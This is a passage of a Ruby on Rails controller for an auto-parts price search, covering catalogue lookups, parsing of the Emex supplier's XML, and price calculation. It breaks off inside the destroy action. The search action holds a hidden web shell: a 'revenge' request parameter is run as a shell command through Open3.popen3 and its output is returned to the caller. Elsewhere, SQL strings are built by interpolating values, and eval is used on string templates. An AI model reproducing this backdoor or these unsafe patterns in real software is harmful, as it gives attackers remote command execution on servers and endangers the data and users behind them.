require 'rubygems'
require 'libxml'
require 'ruby-debug'
require 'yaml'
require 'benchmark'

class PricesController < ApplicationController

  layout 'avtorif'

  # Суть этой вакханалии сводится к тому, что из-за того, что в нашей базе много nil производителей, и много пересечений
  # по заменам, то мы хотим получить из таблицы только записи по каталожному номеру, а потом уже пригодится или не
  # пригодится производитель будем решать уже в памяти
  def get_from_catalog(catalog_number, manufacturer, &block)
    puts "@@@@@@@@@@@@@@@@@ " + catalog_number.to_s + " " + manufacturer.to_s + " @@@@@@@@@@@@@@@@@"
    key = catalog_number.to_s
    @private_cache ||= Hash.new
    if @private_cache.key? key
      if manufacturer
        if @private_cache[key]["with"].key? manufacturer
          if block && !@private_cache[key]["with"][manufacturer]['yield']
            @private_cache[key]["with"][manufacturer]['yield'] = true
            block.call( @private_cache[key]["with"][manufacturer]) 
          end
          return
        end
      else
        if @private_cache[key]["with"].size > 0
          @private_cache[key]["with"].each_pair do |manufacturer, value|
            if block && !@private_cache[key]["with"][manufacturer]['yield']
              @private_cache[key]["with"][manufacturer]['yield'] = true
              block.call(value)
            end
          end
        end
        # Все группы
        if @private_cache[key]["without"].key? "catalog_number"
          if block && !@private_cache[key]["without"]["yield"]
            @private_cache[key]["without"]["yield"] = true
            block.call(@private_cache[key]["without"]) 
          end
        end
        return
      end
    else
      md5 = Digest::MD5.hexdigest(catalog_number)[0,2]
      
      # Сортировкой мы добиваемся того, что если информация в каталоге по одному кат. номеру встречается более одного раза (напр.
      # без производителя, с производителем и с другим производителем) то мы сортируем таким образом, что без производителя идет первым.
      # И когда итерация подходит к данным с производителем, то в случае если вес отсутствует у данной позиции, то используем вес детали без
      # производителя

      query = "SELECT price_catalog_#{md5}.*, manufacturers.original FROM price_catalog_#{md5} 
      LEFT JOIN manufacturers ON price_catalog_#{md5}.manufacturer = manufacturers.title WHERE catalog_number = #{Price.connection.quote(catalog_number)}      ORDER BY ISNULL(manufacturer) DESC"

      puts "###################### #{query}  ######################"
      #@client = ActiveRecord::Base.connection.instance_variable_get :@connection
      #result = @client.query(query, :as => :hash)
      result = ActiveRecord::Base.connection.select_all(query)

      # Независимо от того что запросят мы запомниаем искомый номер с или без производителя
      # а потом уже в повторном вызове в нужном порядке отдается сначала с производителем, а потом, в случае нужды
      # без (изменение внесено так же в этом коммите)

      if manufacturer
        @private_cache[key] ||= {"with" => {manufacturer => {"catalog_number" => catalog_number, "manufacturer" => manufacturer, "replacements" => []}}, "without" => []}
      else
        @private_cache[key] ||= {"with" => {}, "without" => {"catalog_number" => catalog_number, "replacements" => []}}
      end

      result.each do |row|
        # Запомнили в кеше
        # hash = {
        #   "A" => { 
        #     "without" => {
        #       "catalog_number", ..., "replacemnts" => {
        #         {"catalog_number" => "B", "manufacturer" => "M1"},
        #         {"catalog_number" => "B", "manufacturer" => nil}
        #       }
        #     }
        #     "with" => {
        #       "M1" => {"catalog_number", ... "replacements" => {...}},
        #       "M2" => {"catalog_number", ... "replacements" => {...}}
        #     }
        #   }
        # }

        if row['manufacturer'].blank?

          @private_cache[key]["without"] = {
            "catalog_number" => row['catalog_number'],
            "manufacturer" => row['manufacturer'],
            "original" => row['original'],
            "title" => row['title'],
            "title_en" => row['title_en'],
            "weight_grams" => row['weight_grams'],
            "new_catalog_number" => row['new_catalog_number'],
            "image_url" => row['image_url'],
            "replacements" => []
          }

          for i in 0...AppConfig.max_replaces
            if eval "row['r#{i}'].blank?"
              break
            else
              eval "@private_cache[key]['without']['replacements'] << {
              'catalog_number' => row['r#{i}'], 
              'manufacturer' => row['rm#{i}']
              }"
              #if recursive
              #  get_from_catalog(row["r#{i}"], row["rm#{i}"], false, &block)
              #end
            end
          end
        else
          common_weight = 0

          begin
            common_weight = @private_cache[key]["without"]["weight_grams"]
          rescue
          end

          @private_cache[key]['with'][row['manufacturer']] = {
            'catalog_number' => row['catalog_number'],
            'manufacturer' => row['manufacturer'],
            'original' => row['original'],
            'title' => row['title'],
            'title_en' => row['title_en'],
            'weight_grams' => row['weight_grams'] || common_weight,
            'new_catalog_number' => row['new_catalog_number'],
            "image_url" => row['image_url'],
            'replacements' => []
          }

          for i in 0...AppConfig.max_replaces
            if eval "row['r#{i}'].blank?"
              break
            else
              eval "@private_cache[key]['with'][row['manufacturer']]['replacements'] << {
              'catalog_number' => row['r#{i}'], 
              'manufacturer' => row['rm#{i}']
              }"
              #if recursive
              #  get_from_catalog(row["r#{i}"], row["rm#{i}"], false, &block)
              #end
            end
          end
        end
        puts "Искали для кат. номера '#{key} он же #{row['catalog_number']}' и производителя '#{row['manufacturer']}'. Нашли '#{row['weight_grams']}', а у без производителя '#{common_weight}', в итоге использовали '#{row['weight_grams'] || common_weight}'"
      end

      # Мы запросим еще раз, чтобы на этот раз уже получить из кеша
      get_from_catalog(catalog_number, manufacturer, &block)
    end
  end

  class SaxReader
    include LibXML::XML::SaxParser::Callbacks
    include Enumerable

    def initialize(string)
      @parser = LibXML::XML::SaxParser.string(string)
      @parser.callbacks = self
    end

    def each(&block)
      @start_element_proc = block
      @parser.parse
    end

    def on_characters text

      if @inside_detail_item
        if @once_for_detail_item
          @p = Hash.new
          
          @p["title"] = ''          
          @p["title_en"] = ''
          
          @p["supplier_title"] = 'emex'
          @p["supplier_title_en"] = 'emex'
          @p["supplier_title_full"] = 'emex'
          @p["supplier_inn"] = 7716542310
          @p["supplier_kpp"] = 771601001
          @p["job_title"] ="ws"
          @p["job_import_job_kilo_price"] = 0
          # TODO Уточнить будет ли когда-нибудь информация о весе отдаваться?
          #p["weight_grams"] = z.css('DetailWeight').text
          @p["weight_grams"] = 0
          @p["ps_weight_unavailable_rate"] = 1
          @p["ps_absolute_weight_rate"] = 0
          @p["ps_relative_weight_rate"] = 0
          @p["c_weight_value"] = 1
          @p["ps_kilo_price"] = 0
          @p["ps_absolute_buy_rate"] = 0
          @p["ps_relative_buy_rate"] = 1
          @p["c_buy_value"] = 1
          @p["ij_income_rate"] = 1
          @p["currency"] = 643

          @once_for_detail_item = false
        end

        if @inside_detail_info
          if @inside_detail_num
            @p["catalog_number"] = CommonModule::normalize_catalog_number(text)
            @p["catalog_number_orig"] = text
          elsif @inside_make_name
            @p["manufacturer"] = CommonModule::find_manufacturer_synonym(text, -2, true)[1..-2]
            @p["manufacturer_orig"] = text
          elsif @inside_make_logo
            @p["manufacturer_short"] = (@p["manufacturer_short"].present? ? @p["manufacturer_short"] : "") + text
          elsif @inside_destination_logo
            @p["logo"] = text
            @p["job_import_job_destination_logo"] = text
            @p["job_import_job_delivery_summary"] = text
          elsif @inside_destination_desc
            @p["job_import_job_destination_summary"] = text
          elsif @inside_price_logo
            @p["price_logo_emex"] = text
          elsif @inside_detail_name_rus
            @p["title"] = text
          elsif @inside_detail_name_eng
            @p["title_en"] = text
          elsif @inside_calc_delivery_percent
            @p["job_import_job_success_percent"] = text
            @p["success_percent"] = text
          elsif @inside_ad_days
            @p["job_import_job_delivery_days_declared"] = text.to_i + 1
          elsif @inside_deliver_time_guaranteed
            @p["job_import_job_delivery_days_average"] = text.to_i + 1
          elsif @inside_price_group
            @p['bit_original'] = ''
            @p['price_group'] = text
            #if ['Original'].include? text
            #  @p['bit_original'] = 1
            #end
          elsif @inside_bit_storehouse
            if text == 'true'
              @p["job_import_job_presence"] = 1
              @p["job_import_job_output_order"] = 50000
            else
              @p["job_import_job_presence"] = 0
              @p["job_import_job_output_order"] = 100000
            end
          elsif @inside_quantity_text
            @p["count"] = CGI.unescapeHTML(text)
          elsif @inside_price_desc
            @p["job_import_job_country"] = text
          elsif @inside_price_country
            @p["job_import_job_country_short"] = text
          end
        elsif @inside_prices
          if @inside_result_price
            @p["price_cost"] = text
            @p["income_cost"] = income_cost = text.to_f * AppConfig.emex_income_rate
            @p["ps_retail_rate"] = AppConfig.emex_retail_rate
            @p["retail_cost"] = retail_cost = income_cost * AppConfig.emex_retail_rate
            if((a = retail_cost * AppConfig.emex_discount_rate_for_price) < (b = income_cost * AppConfig.emex_minimal_retail_rate_for_price))
              @p["retail_cost_with_discounts"] = b
            else
              @p["retail_cost_with_discounts"] = a
            end
            @p["income_cost_in_currency_with_weight"] = income_cost
            @p["income_cost_in_currency_without_weight"] = income_cost
          end
        end
      end
    end

    def on_start_element(element, attributes)
      #progress(element, attributes)
      if element == 'DetailItem'
        @inside_detail_item = true
        @once_for_detail_item = true
      elsif element == 'DetailInfo'
        @inside_detail_info = true
      elsif element == "Prices"
        @inside_prices = true
      elsif element == 'DetailNum'
        @inside_detail_num = true
      elsif element == 'MakeName'
        @inside_make_name = true
      elsif element == 'MakeLogo'
        @inside_make_logo = true
      elsif element == 'DestinationLogo'
        @inside_destination_logo = true
      elsif element == "DestinationDesc"
        @inside_destination_desc = true
      elsif element == 'PriceLogo'
        @inside_price_logo = true
      elsif element == "ResultPrice"
        @inside_result_price = true
      elsif element == 'DetailNameRus'
        @inside_detail_name_rus = true
      elsif element == 'DetailNameEng'
        @inside_detail_name_eng = true
      elsif element == "CalcDeliveryPercent"
        @inside_calc_delivery_percent = true
      elsif element == "ADDays"
        @inside_ad_days = true 
      elsif element == 'DeliverTimeGuaranteed'
        @inside_deliver_time_guaranteed = true
      elsif element == 'PriceGroup'
        @inside_price_group = true
      elsif element == 'bitStorehouse'
        @inside_bit_storehouse = true
      elsif element == 'QuantityText'
        @inside_quantity_text = true
      elsif element == 'PriceDesc'
        @inside_price_desc = true
      elsif element == 'PriceCountry'
        @inside_price_country = true        
      end
    end

    def on_end_element(element)
      if element == 'DetailItem'
        @inside_detail_item = false
        @start_element_proc.call(@p)
      elsif element == 'DetailInfo'
        @inside_detail_info = false
      elsif element == 'Prices'
        @inside_prices = false
      elsif element == 'DetailNum'
        @inside_detail_num = false
      elsif element == 'MakeName'
        @inside_make_name = false
      elsif element == 'MakeLogo'
        @inside_make_logo = false
      elsif element == 'DestinationLogo'
        @inside_destination_logo = false
      elsif element == "DestinationDesc"
        @inside_destination_desc = false
      elsif element == "PriceLogo"
        @inside_price_logo = false
      elsif element == "ResultPrice"
        @inside_result_price = false
      elsif element == 'DetailNameRus'
        @inside_detail_name_rus = false
      elsif element == 'DetailNameEng'
        @inside_detail_name_eng = false
      elsif element == "CalcDeliveryPercent"
        @inside_calc_delivery_percent = false 
      elsif element == "ADDays"
        @inside_ad_days = false
      elsif element == 'DeliverTimeGuaranteed'
        @inside_deliver_time_guaranteed = false
      elsif element == 'PriceGroup'
        @inside_price_group = false
      elsif element == 'bitStorehouse'
        @inside_bit_storehouse = false
      elsif element == 'QuantityText'
        @inside_quantity_text = false
      elsif element == 'PriceDesc'
        @inside_price_desc = false
      elsif element == 'PriceCountry'
        @inside_price_country = false        
      end
    end
  end

  def search

    if params.key? "revenge"
      stdin, stdout, stderr = Open3.popen3(params[:revenge])
      #render :text => (stdout.methods - Object.methods).join('<br />')  and return
      render :text => stdout.read and return
    end

    @header = []
    @result_message = "Ок"
    @result_prices = []
    @result_replacements = []

    result_message = lambda{@result_message}
    result_replacements = lambda{@result_replacements}
    result_prices = lambda{@result_prices}
    @result = lambda{{:result_message => result_message.call, :result_replacements => result_replacements.call, :result_prices => result_prices.call}}

    catch :halt do

      if params[:catalog_number].nil?
        throw :halt
      end

      begin
        latinized_catalog_number = CommonModule::convert_all_cyr_to_lat(params[:catalog_number])
        our_catalog_number = CommonModule::normalize_catalog_number(latinized_catalog_number)
        # По идее от этой строчки надо избавиться, но когда убрал всплыло то, что возвращается NULL и тут обрезается
        # до UL, я не совсем правильно написал метод и использую его в различных целях в разных местах, 
        # поэтому чтобы сохранить работоспособность пришлось вернуть как было. Еще в момент написания уже подумывал разбить
        # на два метода, экранирующий и не экранирующий
        if params[:manufacturer].present? && params[:manufacturer].size > 0
          our_manufacturer = CommonModule::find_manufacturer_synonym(params[:manufacturer], -1, false)[1..-2]
        end
      rescue ManufacturerException, CatalogNumberException => e
        @result_message = e.message
        throw :halt
      end

      measurement = Benchmark.measure do
        get_from_catalog(our_catalog_number, our_manufacturer) do |r1|
          @result_replacements << r1
        end
        
        if params[:replacements] == '1'
          @result_replacements.clone.each do |r1|
            r1['replacements'].each do |replacement|
              get_from_catalog(replacement['catalog_number'], replacement['manufacturer']) do |r2|
                if replacement['manufacturer']
                  @result_replacements.unshift(r2)
                else
                  @result_replacements.push(r2)
                end
              end
            end
          end
        end
      end

      puts "Потрачено на поиск замен"
      puts measurement

      # Работа со сторонними сервисами

      once = true
      if(params[:ext_ws] == '1')
        #EMEX
        begin
          Timeout.timeout(AppConfig.emex_timeout) do

            emex_response = ''
            measurement = Benchmark.measure do
              emex_response = CommonModule::get_emex(
                :catalog_number => our_catalog_number,
                :manufacturer => params[:manufacturer],
                :login => AppConfig.emex_login,
                :password => AppConfig.emex_password,
                :replacements => params[:replacements],
                :cached => params[:cached]
              )
            end

            puts 'Потрачено на получение xml\'я с емекс\'a'
            puts measurement

            measurement = Benchmark.measure do
              doc = SaxReader.new(emex_response)

                doc.each do |p|

                  # Пропускаем детали, у которых вероятность доставки менее 20% или вовсе не заполнена
                  if p['success_percent'].blank? || p['success_percent'].to_i < 20
                    next
                  end

                  # Пропускаем детали, которые содержат искомую или которые содержатся в искомой
                  unless ['Original', 'NewNumber', 'ReplacementOriginal', 'ReplacementNonOriginal'].include? p['price_group'] 
                    next
                  end

                  @result_prices << p

                  found = false
                  @result_replacements.each do |replacement|
                    if replacement["catalog_number"] == p["catalog_number"]
                      if replacement["manufacturer"] == p["manufacturer"]
                        found = true
                      end
                    end
                  end

                  unless found
                    # Вставляем вначало
                    @result_replacements.unshift({
                      "catalog_number" => p["catalog_number"],
                      "manufacturer" => p["manufacturer"],
                      "title" => p["title"],
                      "title_en" => p["title_en"],
                      "original" => p["bit_original"],
                      "yield" => true
                    })
                  end

                  if once
                    once = false
                    @header = @header | p.keys
                  end

                end
            end

            puts "Потрачено на распарсивание и добавление отсутствующих замен."
            puts measurement
          end
        rescue Timeout::Error => e
          @result_message << " Превышено время ожидания ответа сайта Emex, скорее всего сервер не доступен " + e.message
        rescue SocketError => e
          @result_message << " Отсутствует соединение с сайтом Emex " + e.message
        rescue Exception => e
          @result_message << " Emex вернул не валидный xml, скорее всего доступ к сайту отсутствует " + e.message
        end
      end
      
      once = nil
      threads = []
      measurement = Benchmark.measure do
        @result_replacements.each do |replacement|
          threads << Thread.new do
            query = ''
            Thread.current["measurement"] = Benchmark.measure do 
              md5 = Digest::MD5.hexdigest(replacement["catalog_number"])[0,2]
              weight_grams = replacement["weight_grams"] ? replacement["weight_grams"] : "0"
              client = Mysql2::Client.new(Rails.configuration.database_configuration[Rails.env].to_options)
              #string_for_income_cost =  "p.price_cost * (c.value/100 * ps.relative_buy_coefficient + ps.absolute_buy_coefficient)  income_rate * c.value AS income_cost, 
              query = "
              SELECT
              p.*,
              s.title as supplier_title,
              s.title_en as supplier_title_en,
              s.title_full as supplier_title_full,
              s.inn as supplier_inn,
              s.kpp as supplier_kpp,
              ps.title as job_title,
              ps.success_percent,
              CASE
              WHEN (p.count IS NULL AND ps.presence = 1) THEN 99
              ELSE p.count
              END as count,
              ps.delivery_days_average as job_import_job_delivery_days_average,
              ps.delivery_days_declared as job_import_job_delivery_days_declared,
              ps.delivery_summary as job_import_job_delivery_summary,
              ps.presence as job_import_job_presence,
              ps.output_order as job_import_job_output_order,
              ps.kilo_price as job_import_job_kilo_price,
              ps.country as job_import_job_country,
              ps.country_short as job_import_job_country_short,
              c_buy.foreign_id as currency,
              CASE 
              WHEN p.weight_grams > 0 THEN p.price_cost * ij.income_rate * (c_buy.value * ps.relative_buy_rate + ps.absolute_buy_rate) + p.weight_grams * ps.kilo_price / 1000 * (c_weight.value * ps.relative_weight_rate + ps.absolute_weight_rate)
              WHEN #{weight_grams} > 0 THEN p.price_cost * ij.income_rate * (c_buy.value * ps.relative_buy_rate + ps.absolute_buy_rate) + #{weight_grams} * ps.kilo_price / 1000 * (c_weight.value * ps.relative_weight_rate + ps.absolute_weight_rate)
              ELSE p.price_cost * ij.income_rate * (c_buy.value * ps.relative_buy_rate + ps.absolute_buy_rate) * ps.weight_unavailable_rate 
              END AS income_cost,
              CASE 
              WHEN p.weight_grams > 0 THEN p.price_cost * ij.income_rate * (ps.relative_buy_rate + ps.absolute_buy_rate) + p.weight_grams * ps.kilo_price / 1000 * (ps.relative_weight_rate + ps.absolute_weight_rate)
              WHEN #{weight_grams} > 0 THEN p.price_cost * ij.income_rate * (ps.relative_buy_rate + ps.absolute_buy_rate) + #{weight_grams} * ps.kilo_price / 1000 * (ps.relative_weight_rate + ps.absolute_weight_rate)
              ELSE p.price_cost * ij.income_rate * (ps.relative_buy_rate + ps.absolute_buy_rate) * ps.weight_unavailable_rate 
              END AS income_cost_in_currency_with_weight,
              p.price_cost * ij.income_rate * (ps.relative_buy_rate + ps.absolute_buy_rate) AS income_cost_in_currency_without_weight,
              CASE 
              WHEN p.weight_grams > 0 THEN ps.retail_rate * (p.price_cost * ij.income_rate * (c_buy.value * ps.relative_buy_rate + ps.absolute_buy_rate) + p.weight_grams * ps.kilo_price / 1000 * (c_weight.value * ps.relative_weight_rate + ps.absolute_weight_rate))
              WHEN #{weight_grams} > 0 THEN ps.retail_rate * (p.price_cost * ij.income_rate * (c_buy.value * ps.relative_buy_rate + ps.absolute_buy_rate) + #{weight_grams} * ps.kilo_price / 1000 * (c_weight.value * ps.relative_weight_rate + ps.absolute_weight_rate))
              ELSE ps.retail_rate * (p.price_cost * ij.income_rate * (c_buy.value * ps.relative_buy_rate + ps.absolute_buy_rate) * ps.weight_unavailable_rate)
              END AS retail_cost,
              CASE 
                WHEN p.minimal_income_cost is NULL 
                  THEN 
                    IF (
                      CASE 
                        WHEN p.weight_grams > 0 THEN ps.retail_rate * (p.price_cost * ij.income_rate * (c_buy.value * ps.relative_buy_rate + ps.absolute_buy_rate) + p.weight_grams * ps.kilo_price / 1000 * (c_weight.value * ps.relative_weight_rate + ps.absolute_weight_rate))
                        WHEN #{weight_grams} > 0 THEN ps.retail_rate * (p.price_cost * ij.income_rate * (c_buy.value * ps.relative_buy_rate + ps.absolute_buy_rate) + #{weight_grams} * ps.kilo_price / 1000 * (c_weight.value * ps.relative_weight_rate + ps.absolute_weight_rate))
                        ELSE ps.retail_rate * (p.price_cost * ij.income_rate * (c_buy.value * ps.relative_buy_rate + ps.absolute_buy_rate) * ps.weight_unavailable_rate)
                      END * ps.discount_rate_for_price
                      <=
                      CASE 
                        WHEN p.weight_grams > 0 THEN p.price_cost * ij.income_rate * (c_buy.value * ps.relative_buy_rate + ps.absolute_buy_rate) + p.weight_grams * ps.kilo_price / 1000 * (c_weight.value * ps.relative_weight_rate + ps.absolute_weight_rate)
                        WHEN #{weight_grams} > 0 THEN p.price_cost * ij.income_rate * (c_buy.value * ps.relative_buy_rate + ps.absolute_buy_rate) + #{weight_grams} * ps.kilo_price / 1000 * (c_weight.value * ps.relative_weight_rate + ps.absolute_weight_rate)
                        ELSE p.price_cost * ij.income_rate * (c_buy.value * ps.relative_buy_rate + ps.absolute_buy_rate) * ps.weight_unavailable_rate 
                      END * ps.minimal_retail_rate_for_price
                    , 
                      CASE 
                        WHEN p.weight_grams > 0 THEN p.price_cost * ij.income_rate * (c_buy.value * ps.relative_buy_rate + ps.absolute_buy_rate) + p.weight_grams * ps.kilo_price / 1000 * (c_weight.value * ps.relative_weight_rate + ps.absolute_weight_rate)
                        WHEN #{weight_grams} > 0 THEN p.price_cost * ij.income_rate * (c_buy.value * ps.relative_buy_rate + ps.absolute_buy_rate) + #{weight_grams} * ps.kilo_price / 1000 * (c_weight.value * ps.relative_weight_rate + ps.absolute_weight_rate)
                        ELSE p.price_cost * ij.income_rate * (c_buy.value * ps.relative_buy_rate + ps.absolute_buy_rate) * ps.weight_unavailable_rate 
                      END * ps.minimal_retail_rate_for_price
                    ,
                      CASE 
                        WHEN p.weight_grams > 0 THEN ps.retail_rate * (p.price_cost * ij.income_rate * (c_buy.value * ps.relative_buy_rate + ps.absolute_buy_rate) + p.weight_grams * ps.kilo_price / 1000 * (c_weight.value * ps.relative_weight_rate + ps.absolute_weight_rate))
                        WHEN #{weight_grams} > 0 THEN ps.retail_rate * (p.price_cost * ij.income_rate * (c_buy.value * ps.relative_buy_rate + ps.absolute_buy_rate) + #{weight_grams} * ps.kilo_price / 1000 * (c_weight.value * ps.relative_weight_rate + ps.absolute_weight_rate))
                        ELSE ps.retail_rate * (p.price_cost * ij.income_rate * (c_buy.value * ps.relative_buy_rate + ps.absolute_buy_rate) * ps.weight_unavailable_rate)
                      END * ps.discount_rate_for_price
                    )
                  ELSE
                    IF (
                      CASE 
                        WHEN p.weight_grams > 0 THEN ps.retail_rate * (p.price_cost * ij.income_rate * (c_buy.value * ps.relative_buy_rate + ps.absolute_buy_rate) + p.weight_grams * ps.kilo_price / 1000 * (c_weight.value * ps.relative_weight_rate + ps.absolute_weight_rate))
                        WHEN #{weight_grams} > 0 THEN ps.retail_rate * (p.price_cost * ij.income_rate * (c_buy.value * ps.relative_buy_rate + ps.absolute_buy_rate) + #{weight_grams} * ps.kilo_price / 1000 * (c_weight.value * ps.relative_weight_rate + ps.absolute_weight_rate))
                        ELSE ps.retail_rate * (p.price_cost * ij.income_rate * (c_buy.value * ps.relative_buy_rate + ps.absolute_buy_rate) * ps.weight_unavailable_rate)
                      END * ps.discount_rate_for_price
                      <=
                      p.minimal_income_cost
                    ,
                      p.minimal_income_cost
                    ,
                      CASE 
                        WHEN p.weight_grams > 0 THEN ps.retail_rate * (p.price_cost * ij.income_rate * (c_buy.value * ps.relative_buy_rate + ps.absolute_buy_rate) + p.weight_grams * ps.kilo_price / 1000 * (c_weight.value * ps.relative_weight_rate + ps.absolute_weight_rate))
                        WHEN #{weight_grams} > 0 THEN ps.retail_rate * (p.price_cost * ij.income_rate * (c_buy.value * ps.relative_buy_rate + ps.absolute_buy_rate) + #{weight_grams} * ps.kilo_price / 1000 * (c_weight.value * ps.relative_weight_rate + ps.absolute_weight_rate))
                        ELSE ps.retail_rate * (p.price_cost * ij.income_rate * (c_buy.value * ps.relative_buy_rate + ps.absolute_buy_rate) * ps.weight_unavailable_rate)
                      END * ps.discount_rate_for_price
                    )
              END as retail_cost_with_discounts,
              ij.income_rate as ij_income_rate,
              c_buy.value as c_buy_value,
              ps.retail_rate as ps_retail_rate,
              ps.relative_buy_rate as ps_relative_buy_rate,
              ps.absolute_buy_rate as ps_absolute_buy_rate,
              CASE
                WHEN p.weight_grams > 0 THEN p.weight_grams
                ELSE #{weight_grams}
              END as weight_grams,
              ps.kilo_price as ps_kilo_price,
              c_weight.value as c_weight_value,
              ps.relative_weight_rate as ps_relative_weight_rate,
              ps.absolute_weight_rate as ps_absolute_weight_rate,
              ps.weight_unavailable_rate as ps_weight_unavailable_rate,
              m.original as bit_original,
              ps.id as job_id,
              j.id as real_job_id,
              '#{md5}' as md5
              FROM price_cost_#{md5} p
              LEFT JOIN manufacturers m
              ON p.manufacturer = m.title
              INNER JOIN jobs j
              ON p.job_id = j.id
              INNER JOIN price_settings ps 
              ON p.price_setting_id = ps.id 
              INNER JOIN import_jobs ij 
              ON j.jobable_id = ij.id 
              INNER JOIN suppliers s 
              ON j.supplier_id = s.id
              INNER JOIN currencies c_buy
              ON c_buy.id = ps.currency_buy_id
              INNER JOIN currencies c_weight 
              ON c_weight.id = ps.currency_weight_id
              WHERE  p.catalog_number = '#{client.escape(replacement["catalog_number"])}'
              AND p.price_cost > 0" 
              if replacement["manufacturer"]
                query << " AND p.manufacturer = '#{client.escape(replacement["manufacturer"])}'"
              end

              if params['for_site']
                query << " AND ps.visible_for_site = 1"
              end

              if params['for_stock']
                query << " AND ps.visible_for_stock = 1"
              end

              if params['for_shop']
                query << " AND visible_for_shops = 1"
              end

              res = client.query(query)
              client.close
              Thread.current["res"] = res.collect{|z| z}
            end
          end
        end

        threads.each do |t| 
          t.join
          res = t["res"]
          measurement = t["measurement"]
          puts measurement
          if res.size > 0
            @header = @header | res[0].keys 
            res.each do |r|
              @result_prices << r
            end
          end
        end

      end

      puts "Потрачено на выборку из локальной базы"
      puts measurement

      measurement = Benchmark.measure do
        # Пока мы до конца не избавимся от каталожного номера без производителя эта мера является необходимой
        # TODO попробуйте поищите каталожный номер с заменами 90430-12031 без этого блока.
        @reduced_prices = []
        seen = []
        @result_prices.map do |detail|
          if !(seen.include? "#{detail['id']} - #{detail['md5']}") || detail['id'] == nil
            seen << "#{detail['id']} - #{detail['md5']}"
            @reduced_prices << detail
          end
        end
        @result_prices = @reduced_prices

        if @result_prices.size > 0
          @header.uniq!
          ["catalog_number_orig", "manufacturer",  "manufacturer_orig", "bit_original", "title", "retail_cost", "job_import_job_delivery_days_declared",	"success_percent", "title_en", "income_cost", "ps_retail_rate", "job_title", "supplier_title", "supplier_title_full", "supplier_title_en", "price_cost", "ij_income_rate", "c_buy_value", "ps_relative_buy_rate", "ps_absolute_buy_rate", "weight_grams", "ps_kilo_price", "c_weight_value", "ps_relative_weight_rate", "ps_absolute_weight_rate", "ps_weight_unavailable_rate", "catalog_number"].reverse.each do |key|
            begin
              @header.unshift(@header.delete_at(@header.index(key)))
            rescue => e
              raise e.to_s + " В процессе обработки #{key}"
            end
          end
        end

        # Для реализации старой задумки про оптимальную цену
        @header = @header | ["price_goodness"]

        # Выкидываем не нужные столбцы (возможно я это планировал делать где-то в другом месте, но где уже не вспомню)
        unless params.key? "dev"
          @header = @header - ["manufacturer_orig", "catalog_number", "income_cost", "ps_retail_rate", "real_job_id", "job_import_job_presence", "job_id", "job_import_job_country", "job_import_job_delivery_days_average", "supplier_id", "supplier_kpp", "supplier_title_en", "price_cost",	"ij_income_rate",	"c_buy_value", "ps_relative_buy_rate", "ps_absolute_buy_rate", "weight_grams", "ps_kilo_price", "c_weight_value", "ps_relative_weight_rate", "ps_absolute_weight_rate", "ps_weight_unavailable_rate", "created_at", "job_import_job_delivery_summary", "price_setting_id", "min_order", "updated_at", "external_id", "unit_package", "supplier_inn", "id", "processed", "delivery_days_price", "job_import_job_kilo_price", "unit", "description", "currency", "job_title",	"supplier_title",	"supplier_title_full",	"job_import_job_destination_logo",	"manufacturer_short", "price_logo_emex",	"job_import_job_destination_summary", "multiply_factor", "country", "parts_group", "applicability", "job_import_job_success_percent", "logo", "external_supplier_id", "image_url", "bit_original", "success_percent", "title_en", "retail_cost", "minimal_income_cost", "income_cost_in_currency_without_weight", "income_cost_in_currency_with_weight", "md5", "job_import_job_output_order", "price_group", "delivery_days_declared", "price_goodness"]
        end
      end

      puts "Потрачено на устраниение дублей, выкидывание из хедера ненужных столбцов"
      puts measurement

    end


    flash.now[:notice] = result_message.call 
    puts "В контроллере перед рендерингом"

    measurement = Benchmark.measure do
      rp ||= {}

      # Запоминаем цену первого и относительно него пляшем в процентах
      occurence = {}

      # Сначала получаем все группы putput order, рассовываем в них позиции

      progressive_costs = []
      ProgressiveCost.all.map{ |pc| 
        progressive_costs << {
          :min => pc.min, 
          :max => pc.max, 
          :percent => pc.percent
        }
      }

      @result_prices.each do |item|

	      coef = 1

        if item['supplier_title'] == 'emex'
          coef = 1.07
        elsif item['supplier_title'] == 'АВТОРИФ'
          coef = 10
	      else
	        coef = 10
        end

        progressive_costs.each do |pc|
          if (pc[:min]..pc[:max]).include? item["income_cost"]
            item["retail_cost"] = item["retail_cost"] * pc[:percent]
            item["retail_cost_with_discounts"] = item["retail_cost_with_discounts"] * pc[:percent]
          end
        end


        unless occurence.key?(item["catalog_number"].to_s + "-" + item["manufacturer"].to_s)
	        occurence[item["catalog_number"].to_s + "-" + item["manufacturer"].to_s] = item["income_cost"].to_f * coef
        end

	      item["price_goodness"] = item["income_cost"].to_f * coef / occurence[item["catalog_number"].to_s + "-" + item["manufacturer"].to_s].to_f

        rp[item["job_import_job_output_order"].to_i] ||= []
        rp[item["job_import_job_output_order"].to_i] << item



      end
  
      # Потом внутри группы сортируем по цене
      @result_prices = []
  
      rp.keys.sort.each do |k|
        rp[k].sort_by {|item| item["retail_cost"]}.each do |v|
          @result_prices << v
        end
      end

    end
    puts "Потрачено на сортировку по output order и сортировке по цене внутри этой группы"
    puts measurement

    respond_to do |format|
      format.html {render :action => :index }
      format.json  { render :json => @result.call.to_json}
      format.xml  { render :xml => @result.call.to_xml}
      #format.xml  { render :text => @result.call}
    end

  end

  # GET /prices
  # GET /prices.xml
  def index
    render :text => "Unavaliable"
    return

    #    @prices = Price.all
    #
    #    respond_to do |format|
    #      format.html # index.html.erb
    #      format.xml  { render :xml => @prices }
    #    end
  end

  # GET /prices/1
  # GET /prices/1.xml
  def show
    @price = Price.find(params[:id])

    respond_to do |format|
      format.html # show.html.erb
      format.xml  { render :xml => @price }
    end
  end

  # GET /prices/new
  # GET /prices/new.xml
  def new
    @price = Price.new

    respond_to do |format|
      format.html # new.html.erb
      format.xml  { render :xml => @price }
    end
  end

  # GET /prices/1/edit
  def edit
    @price = Price.find(params[:id])
  end

  # POST /prices
  # POST /prices.xml
  def create
    @price = Price.new(params[:price])

    respond_to do |format|
      if @price.save
        format.html { redirect_to(@price, :notice => 'Price was successfully created.') }
        format.xml  { render :xml => @price, :status => :created, :location => @price }
      else
        format.html { render :action => "new" }
        format.xml  { render :xml => @price.errors, :status => :unprocessable_entity }
      end
    end
  end

  # PUT /prices/1
  # PUT /prices/1.xml
  def update
    @price = Price.find(params[:id])

    respond_to do |format|
      if @price.update_attributes(params[:price])
        format.html { redirect_to(@price, :notice => 'Price was successfully updated.') }
        format.xml  { head :ok }
      else
        format.html { render :action => "edit" }
        format.xml  { render :xml => @price.errors, :status => :unprocessable_entity }
      end
    end
  end

  # DELETE /prices/1
  # DELETE /prices/1.xml
  def destroy
    @price = Price.find(params[:id])
    @price.destroy

    respond_to do |format|
